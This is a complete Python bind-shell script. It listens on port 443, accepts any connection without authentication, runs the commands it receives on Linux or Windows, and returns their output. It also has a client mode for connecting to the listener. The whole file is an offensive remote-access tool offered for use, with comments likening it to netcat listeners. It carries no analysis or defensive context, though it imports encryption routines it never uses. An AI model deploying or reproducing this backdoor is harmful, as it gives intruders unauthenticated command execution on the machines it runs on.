#!/usr/bin/env python3
import sys
import socket
import argparse
import platform
import threading
import subprocess

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

DEFAULT_PORT = 443
MAX_BUFFER = 4096

def execute_cmd(cmd):
    """Execute a Linux/Windows command."""

    # On Linux system
    if platform.system() == 'Linux':
        try:
            output = subprocess.check_output(f"{cmd}", stderr=subprocess.STDOUT)
        except:
            output = b'Command failed.'
    # On Windows system
    elif platform.system() == 'Windows':
        try:
            output = subprocess.check_output(f"cmd /c {cmd}", stderr=subprocess.STDOUT)
        except:
            output = b'Command failed.'
    
    return output

def decode_and_strip(s):
    """Decode and strip the string."""
    return s.decode('latin-1').strip()

def cleanup(s):
    """Close the socket and exit the program."""
    s.close()
    sys.exit()

def shell_thread(s):
    """Multithreading interactive shell sesion."""
    s.send(b"[ -- Connected -- ]")
    try:
        while True:
            # Print prompt for Linux/Windows
            if platform.system() == 'Linux':
                s.send(b"\r\nEnter command> ")
            elif platform.system() == 'Windows':
                s.send(b"\nEnter command> ")
            else:
                print('The system must be Linux/Windows.')
                cleanup(s)

            data = s.recv(MAX_BUFFER)
            if data:
                buffer = decode_and_strip(data)
                if not buffer or buffer == 'exit':
                    cleanup(s)
                print(f"> Executing command: '{buffer}'")
                s.send(execute_cmd(buffer))
    except:
        print("shell_thread error. Terminating...")
        cleanup(s)

def send_thread(s):
    """Multithreading send()."""
    try:
        while True:
            data = input() + '\n'
            s.send(data.encode('latin-1'))
    except:
        print('send_thread error. Terminating...')
        cleanup(s)

def recv_thread(s):
    """Multithreading recv()."""
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                print('\n' + data, end='', flush=True)
    except:
        print('recv_thread error. Terminating...')
        cleanup(s)

def server():
    """Socket server."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', DEFAULT_PORT))
    s.listen()

    print('[ -- Starting Bind Shell -- ]')
    while True:
        client_socket, addr = s.accept()
        print('[ -- New User Connected -- ]')
        threading.Thread(target=shell_thread, args=(client_socket,)).start()

def client(ip):
    """Socket client."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))

    print('[ -- Connecting to Bind Shell -- ]')
    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()

def main():
    parser = argparse.ArgumentParser()

    # Usage: python3 bind_shell.py -l
    # This is similar to nc -nvlp 1337
    parser.add_argument(
        '-l',
        '--listen',
        action='store_true',
        help='Setup a bind shell',
        required=False,
    )
    # Usage: python3 bind_shell.py -c 127.0.0.1
    # This is similar to nc 127.0.0.1 1337
    parser.add_argument(
        '-c',
        '--connect',
        help='Connect to a bind shell',
        required=False,
    )

    args = parser.parse_args()
    if args.listen:
        server()
    elif args.connect:
        client(args.connect)

if __name__ == '__main__':
    main()
